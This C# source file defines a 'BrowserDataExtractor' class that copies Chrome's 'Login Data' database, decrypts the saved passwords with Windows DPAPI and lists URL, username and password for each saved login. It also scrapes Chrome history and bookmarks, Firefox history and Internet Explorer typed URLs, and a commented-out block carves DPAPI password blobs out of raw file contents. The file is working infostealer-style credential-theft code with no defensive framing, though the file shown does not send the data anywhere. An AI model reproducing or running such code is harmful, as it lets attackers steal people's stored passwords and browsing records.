using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Data.SQLite;

namespace TP
{
    public class BrowserDataExtractor : DataExtractor
    {

        public BrowserDataExtractor(string outputFileName)
        {
            fileName = outputFileName;
        }

        protected override string ExtractData()
        {
            List<string> chromeUserPassword = GetChromeUserPassword();
            List<string> chromeHistory = GetChromeHistory();
            List<string> chromeBookmarks = GetChromeBookmarks();
            List<string> firefoxHistory = GetFirefoxHistory();
            List<string> ieHistory = GetIEHistory();

            return "";
        }

        protected List<string> GetIEHistory()
        {
            var localKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
            //var localKey = RegistryKey.OpenBaseKey(RegistryHive.Users, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
            //string pattern = @"S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$";
            //string[] subKeys = localKey.GetSubKeyNames();
            //List<string> paths = new List<string>();
            //foreach (string sk in subKeys)
            //{
            //    if (Regex.IsMatch(sk, pattern))
            //        paths.Add(sk);
            //}

            List<string> history = new List<string>();
            var subKey = localKey.OpenSubKey(@"Software\Microsoft\Internet Explorer\TypedURLs");
            string[] registryKeyValue = subKey?.GetValueNames();

            foreach (string key in registryKeyValue)
            {
                var val = subKey?.GetValue(key);
                history.Add(val.ToString());
            }

            //List<string> history = new List<string>();
            //foreach (string path in paths)
            //{

            //    var subKey = localKey.OpenSubKey(path + @"\Software\Microsoft\Internet Explorer\TypedURLs");
            //    string[] registryKeyValue = subKey?.GetValueNames();

            //    foreach (string key in registryKeyValue)
            //    {
            //        var val = subKey?.GetValue(key);
            //        history.Add(val.ToString());
            //    }

            //}
            return history;
        }

        protected List<string> GetChromeHistory()
        {
            var filePath = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\History";
            string pattern = @"(htt(p|s)://([\w-]+\.)+[\w-]+[\w- ./?%&=]*)*";
            string binaryText = ReadFilePath(filePath, Encoding.Default);

            if (binaryText == null)
                return null;

            Regex historyRegex = new Regex(pattern);
            var historyMatches = historyRegex.Matches(binaryText).OfType<Match>().Select(m => m.Groups[0].Value).Distinct();
            List<string> history = new List<string>();

            foreach (var his in historyMatches)
            {
                history.Add(his);
            }

            return history;
        }

        protected List<string> GetChromeBookmarks()
        {
            var filePath = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks";
            string jsonText = ReadFilePath(filePath, Encoding.Default);
            List<string> jsons = new List<string>(1);
            jsons.Add(jsonText);
            if (jsonText == null)
                return null;

            return jsons;
        }

        protected List<string> GetChromeUserPassword()
        {
            var pathWithEnv = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data";
            var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
            if (filePath == null)
                return null;

            string tempFileName = Path.GetTempPath() + Path.GetRandomFileName();
            File.Copy(filePath, tempFileName);

            string ds = @"Data Source=" + tempFileName;
            SQLiteConnection conn = new SQLiteConnection(ds);
            conn.Open();
            string q = "SELECT action_url, username_value, password_value FROM logins";
            SQLiteCommand cmd = new SQLiteCommand(q, conn);
            SQLiteDataReader dr = cmd.ExecuteReader();
            List<string> pwds = new List<string>();

            while (dr.Read())
            {
                var decrypt = ProtectedData.Unprotect((byte[])dr["password_value"], null, DataProtectionScope.CurrentUser);
                var pwd = Encoding.ASCII.GetString(decrypt);
                string userPwdRow = "URL: " + dr["action_url"] + " " + "Username: " + dr["username_value"] + " " + "Password: " + pwd;
                pwds.Add(userPwdRow);
            }

            return pwds;
            
        }

        protected List<string> GetFirefoxHistory()
        {
            var pathWithEnv = @"%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\";
            var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);

            if (!Directory.Exists(filePath))
                return null;
            
            string fxHistory = Directory.GetDirectories(filePath, "*.*").Where(s => s.EndsWith(".default")).ToList().Last();
            string pattern = @"(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?";
            Regex firefoxHistory = new Regex(pattern);
            string historyFile = ReadFilePath(fxHistory + "\\places.sqlite", Encoding.Default);
            
            Regex histRegex = new Regex(pattern);
            var histMatches = histRegex.Matches(historyFile).OfType<Match>().Select(m => m.Groups[0].Value).Distinct();
            List<string> history = new List<string>();
            foreach (var his in histMatches)
            {
                history.Add(his);
            }

            return history;
        }

        /*protected List<string> ExtractUser(Encoding encoding, string binaryText)
        {
            string pattern = @"(ht|f)tp(s?)\:\/\/[0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*(\/?)";
            Regex userRegex = new Regex(pattern);
            var usrMatches = userRegex.Matches(binaryText).OfType<Match>().Select(m => m.Groups[0].Value).Distinct();
            List<string> usr = new List<string>();

            foreach (var user in usrMatches)
            {
                var usrEncoded = encoding.GetBytes(user.ToString());
                var decPwd = Encoding.Default.GetString(usrEncoded);
                usr.Add(decPwd);
            }

            return usr;
        }

        protected List<string> ExtractPassword(Encoding encoding, string binaryText)
        {
            string pattern = @"(\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)[\s\S]*?(?=\x68\x74\x74\x70|\Z)";
            Regex pwdRegex = new Regex(pattern);
            var pwdMatches = pwdRegex.Matches(binaryText).OfType<Match>().Select(m => m.Groups[0].Value).Distinct();
            List<string> decPwdArray = new List<string>();

            foreach (var pwd in pwdMatches)
            {
                var pwdEncoded = encoding.GetBytes(pwd.ToString());
                var decrypt = ProtectedData.Unprotect(pwdEncoded, null, DataProtectionScope.CurrentUser);
                var decPwd = Encoding.Default.GetString(decrypt);
                decPwdArray.Add(decPwd);
            }

            return decPwdArray;
        }*/

        protected string ReadFilePath(string pathWithEnv, Encoding encoding)
        {
            var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
            if (filePath == null)
                return null;

            // Copia el archivo Login Data de Chrome, ya que si está en uso el navegador falla la solicitud de lectura
            string tempFileName = Path.GetTempPath() + Path.GetRandomFileName();
            File.Copy(filePath, tempFileName);
            FileStream fs = File.OpenRead(tempFileName);
            StreamReader streamReader = new StreamReader(fs, encoding);
            string binaryText = streamReader.ReadToEnd();
            streamReader.Close();
            fs.Close();

            // Luego de leerlo, se elimina la copia
            File.Delete(tempFileName);

            return binaryText;
        }
    }
}
